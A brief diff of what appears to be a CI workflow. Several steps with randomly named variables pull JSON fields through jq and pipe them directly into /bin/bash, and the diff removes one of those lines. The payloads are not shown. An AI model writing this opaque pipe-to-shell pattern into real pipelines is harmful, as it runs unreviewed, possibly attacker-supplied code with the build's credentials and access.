@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$trap5" | jq -r .fw76943 | /bin/bash
           echo $uuzdv585 | jq -r .gbwdh40127 | /bin/bash
           printf '%s' "$ajwf99" | jq -r .qd0364 | /bin/bash
-          printf '%s' "$qxwq35" | jq -r .zj61 | /bin/bash
           printf '%s' "$vs22310" | jq -r .fyvxe32587 | /bin/bash
 
       - name: Upload output
